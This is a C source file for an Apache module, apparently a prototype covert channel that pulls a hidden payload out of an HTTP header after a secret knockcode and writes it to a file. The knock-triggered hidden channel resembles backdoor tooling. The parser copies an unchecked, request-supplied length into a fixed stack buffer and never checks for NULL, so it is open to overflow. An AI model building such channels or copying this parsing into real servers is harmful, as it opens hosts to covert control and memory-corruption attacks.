#include "httpd.h"
#include "http_config.h"

#include "config.h"
#include "utils.h"
#include "packet_builder.h"

void packet_builder(request_rec *r, steg_config *config, server_config *svr){
    //In the prototype, only straight head injection steganography will be used
    if(!strcasecmp(config->method, "Header")){
        header_builder(r, config, svr);
        return;
    }
}


void header_builder(request_rec *r, steg_config *config, server_config *svr){

    const char *injected_header;
    char *x;
    char length_field[PROTOCOL_LENGTH_SIZE+1]; //We need 1 extra byte for the null terminator
    long length_value;
    char payload[PROTOCOL_MAX_PAYLOAD_SIZE]; 

    // Get the value of the HTTP header
    injected_header = apr_table_get(r->headers_in, config->methodconfig);

    // Scan for the knockcode, read the length field (3 bytes) and get the payload
    x = strstr(injected_header, config->knockcode);
    x += strlen(config->knockcode);
    memcpy(length_field, x, PROTOCOL_LENGTH_SIZE);
    length_field[PROTOCOL_LENGTH_SIZE] = '\0';
    length_value = strtol(length_field, NULL, 10);
    x += PROTOCOL_LENGTH_SIZE; // Skip the bytes of the length field
    memcpy(payload, x, length_value);
    // Write the header to the inputfile
    write_inputfile(payload, r, config->inputfile);
}
